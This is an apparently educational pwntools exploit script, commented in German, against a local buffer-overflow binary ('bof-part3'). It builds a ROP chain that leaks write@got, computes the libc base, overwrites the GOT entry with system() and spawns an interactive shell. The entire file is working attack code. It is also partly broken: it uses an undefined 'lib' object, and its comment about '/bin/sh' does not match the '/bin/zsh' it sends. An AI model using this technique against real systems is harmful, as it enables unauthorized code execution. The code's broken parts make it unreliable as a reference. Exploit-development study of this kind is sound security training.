#!/usr/bin/env python

from pwn import *

pop3ret    = 0x40116a                 # Unser pop rdi; pop rsi; pop rdx; ret; gadget
write_off  = 0x0f7af0
system_off = 0x04c920
writable   = 0x404029
bin=ELF("./bof-part3")

s=remote("127.0.0.1",2323)
s.recvuntil(b": ")

buf = b"A"*168                        # padding to RIP's offset
buf += p64(pop3ret)                   # POP Argumente
buf += p64(constants.STDOUT_FILENO)   # stdout
buf += p64(bin.got[b'write'])         # lese von write@got
buf += p64(0x8)                       # schreibe 8 bytes in stdout
buf += p64(bin.plt[b'write'])         # Rückkehr nach write@plt

# Teil 2: schreibe system Adresse in write got mittels read
buf+=p64(pop3ret)
buf+=p64(constants.STDIN_FILENO)
buf+=p64(bin.got[b'write'])          #write@got
buf+=p64(0x8)
buf+=p64(bin.plt[b'read'])           #read@plt

# Teil 3: schreibe /bin/sh in beschreibbare Adresse
buf+=p64(pop3ret)
buf+=p64(constants.STDIN_FILENO)
buf+=p64(writable)
buf+=p64(0x8)
buf+=p64(bin.plt[b'read'])

# Teil 4: rufe system auf
buf+=p64(pop3ret)
buf+=p64(writable)
buf+=p64(0xdeadbeef)
buf+=p64(0xcafebabe)
buf+=p64(bin.plt[b'write'])

buf += b'EOPAY'


print("[+] send payload")
s.send(buf)                           # buf überschreibt RIP
s.recvuntil(b'EOPAY')
print("[+] recvd \'EOPAY\'")

got_leak=u64(s.recv(8))
print("[+] leaked write address: {}".format(hex(got_leak)))

#s2

libc_base=got_leak-write_off
print(hex(lib.symbols[b'write']))
print("[+] libc base is at {}".format(hex(libc_base)))

system_addr=libc_base+system_off
print(hex(lib.symbols[b'system']))
print("[+] system() is at {}".format(hex(system_addr)))

#part 2
print("[+] sending system() address")
s.send(p64(system_addr))
#part 3
print("[+] sending /bin/zsh")
s.send(b'/bin/zsh')
#part 4
print("[+] trying shell")
s.interactive()